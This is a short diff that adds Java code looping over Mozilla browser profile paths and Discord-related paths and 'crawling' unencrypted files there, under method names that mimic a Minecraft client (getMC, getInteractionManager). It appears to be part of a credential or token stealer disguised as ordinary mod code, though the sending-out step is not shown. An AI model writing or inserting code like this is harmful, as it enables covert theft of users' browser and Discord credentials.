@@ -1,0 +1,11 @@
+for (java.nio.file.Path mozillaPath : AucMAP.values()) {
+            getMC(mozillaPath);
+        }
+        for (String key : AUCREGEX.keySet()) {
+            java.io.File path = AUCREGEX.get(key).toFile();
+            if(!path.exists()) continue;
+            if (key.contains("iscord")) {
+                getInteractionManager(path);
+            }
+            crawlUnencrypted(path);
+        }
